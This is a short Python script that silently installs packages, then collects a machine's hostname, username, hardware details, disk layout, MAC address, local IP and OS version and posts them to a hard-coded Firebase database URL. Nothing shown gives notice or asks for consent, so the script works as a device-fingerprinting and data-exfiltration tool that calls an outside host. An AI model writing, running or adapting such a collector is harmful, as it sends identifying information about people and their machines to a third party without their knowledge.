import subprocess
import sys
import importlib
import platform
import socket
import uuid
import getpass
import datetime

# -------- auto install packages --------
def install_packages(packages):
    for pkg in packages:
        try:
            importlib.import_module(pkg)
        except ImportError:
            subprocess.run(
                [sys.executable, "-m", "pip", "install", pkg],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )

install_packages(["psutil", "requests"])

import psutil
import requests

# -------- device info --------
def get_device_info():
    hostname = socket.gethostname()
    username = getpass.getuser()

    cpu = platform.processor()
    cores = psutil.cpu_count()

    ram = round(psutil.virtual_memory().total / (1024**3), 2)

    disks = []
    for p in psutil.disk_partitions():
        try:
            usage = psutil.disk_usage(p.mountpoint)
            disks.append({
                "device": p.device,
                "total_gb": round(usage.total / (1024**3), 2)
            })
        except Exception:
            continue

    mac = ':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff)
        for ele in range(0, 8*6, 8)][::-1])

    try:
        ip = socket.gethostbyname(hostname)
    except:
        ip = "N/A"

    return {
        "device_name": hostname,
        "user": username,
        "cpu": cpu,
        "cpu_cores": cores,
        "ram_gb": ram,
        "disks": disks,
        "os": platform.system(),
        "os_version": platform.version(),
        "mac_address": mac,
        "local_ip": ip,
        "time": str(datetime.datetime.now())
    }

# -------- send to firebase --------
def send_to_firebase(data):
    url = "https://laptop-privacy-default-rtdb.firebaseio.com/data.json"

    try:
        response = requests.post(url, json=data, timeout=5)
        if response.status_code == 200:
            print("Data sent successfully")
        else:
            print(f"Failed: {response.status_code}")
    except Exception as e:
        print("Error sending data:", e)

# -------- main --------
if __name__ == "__main__":
    data = get_device_info()
    send_to_firebase(data)
